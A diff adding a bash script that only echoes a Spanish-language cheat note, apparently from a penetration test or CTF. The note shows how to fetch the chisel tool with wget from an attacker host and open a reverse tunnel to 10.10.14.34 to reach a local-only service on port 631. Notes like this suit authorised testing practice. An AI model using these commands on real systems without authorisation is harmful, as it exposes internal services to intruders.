@@ -1,0 +1,20 @@
+#!/bin/bash
+
+echo '''
+
+Montar el script:
+servidor
+
+descargar con: wget ip/chisel
+
+#CLIENTE:
+./chisel  client 10.10.14.34:1234 R:631:127.9.9.1:631
+
+#SERVIDOR:
+chisel server --reverse -p 1234
+
+con eso tengo acceso al servicio 631 corriendo en esa maquina
+
+
+
+'''
